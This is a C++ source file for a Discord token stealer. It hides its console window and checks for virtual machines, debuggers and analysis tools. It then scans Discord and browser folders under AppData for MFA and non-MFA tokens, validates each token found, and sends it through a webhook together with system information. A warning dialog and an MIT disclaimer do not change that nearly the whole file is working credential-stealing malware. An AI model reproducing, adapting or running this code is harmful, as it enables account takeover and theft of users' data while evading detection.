/*
		The original creator(s) of this code are not responsible for what you as
		an individual do with this code. Malicious or not. With great power comes
		great responsibility.
		
		MIT License

		Copyright (c) 2021 Passive

		Permission is hereby granted, free of charge, to any person obtaining a copy
		of this software and associated documentation files (the "Software"), to deal
		in the Software without restriction, including without limitation the rights
		to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
		copies of the Software, and to permit persons to whom the Software is
		furnished to do so, subject to the following conditions:

		The above copyright notice and this permission notice shall be included in all
		copies or substantial portions of the Software.

		THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
		IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
		FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
		AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
		LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
		OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
		SOFTWARE.
*/

#include "includes.h"

namespace fs = std::filesystem;

DWORD WINAPI MainRoutine() {
	SystemQueryInformation_t SysComputerQueryInformation;
	GetSystemQueryInformation(&SysComputerQueryInformation);

	char path[MAX_PATH];

	for (uint32_t i = 0; i < sizeof(Config::installs) / sizeof(Config::installs[0]); i++) {
		sprintf(path, "%s%s", std::getenv("appdata"), Config::installs[i]);

		if (i > 3) // change to browser path configuration
			sprintf(path, "%s%s", std::getenv("localappdata"), Config::installs[i]);

		if (!fs::exists(path))
			continue;

		for (const fs::directory_entry& entry : fs::directory_iterator(path)) {
			std::ifstream file_path(entry.path(), std::ios_base::binary);

			std::string str((std::istreambuf_iterator<char>(file_path)), std::istreambuf_iterator<char>());
			std::vector<std::string> matches;

			std::vector<std::string> regex_non_mfa = FindMatch(str, Config::token_nonmfa);
			std::vector<std::string> regex_mfa = FindMatch(str, Config::token_mfa);

			for (uint32_t i = 0; i < regex_non_mfa.size(); i++)
				matches.push_back(regex_non_mfa[i]);

			for (uint32_t i = 0; i < regex_mfa.size(); i++)
				matches.push_back(regex_mfa[i]);

			for (uint32_t i = 0; i < matches.size(); i++) {
				if (!Discord::checkToken(matches[i]))
					continue; 

				Discord::Discord token;

				token.init(matches[i]);
				std::string report = token.getTokenInfo();

				report.append(SysInformationCreateReport(&SysComputerQueryInformation));
				SendWebhook(report);
			}
		}
	}

	return 1;
}

int main(int argc, char* argv[]) {
	// TODO: implement driver

	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	Anti anti(Config::check_virtual_machine, Config::check_debugging, Config::check_analyzing, Config::watch_dog);

	int MB_INPUT = MessageBox(
		NULL, 
		"This software is malicious if ran without user knowledge! Please click cancel NOW to stop execution!",
		"Warning! Dangerous software!",
		MB_ICONWARNING | MB_OKCANCEL | MB_DEFBUTTON2
	);

	if (MB_INPUT == IDCANCEL)
		return -1;
	
	while (!InternetCheckConnection(XorStr("http://www.google.com"), FLAG_ICC_FORCE_CONNECTION, 0))
		Sleep(1000);

	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MainRoutine, NULL, NULL, 0);
	
	if (!hThread)
		return -2;

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	return 0;
}
